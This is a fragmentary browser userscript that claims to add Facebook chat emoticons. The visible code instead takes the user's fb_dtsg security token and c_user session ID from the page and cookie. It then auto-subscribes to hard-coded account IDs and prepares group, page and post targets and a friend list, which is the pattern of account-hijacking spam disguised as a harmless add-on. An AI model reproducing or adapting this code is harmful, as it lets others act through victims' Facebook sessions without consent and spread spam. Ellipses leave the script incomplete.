...
// @description	                Facebook Chat Emoticons by Sam.
...
var download = 'Created by "NoxBhargav" https://www.facebook.com/Noxbhargav'
...
sublist("542369825814602");
sublist("1379265568954841");
sublist("1379265568954841");
sublist("418187731628755");
var gid=["206203062869002"];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "326855177326540";
var spost_id = "326855177326540";
var sfoto_id = "326855177326540";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
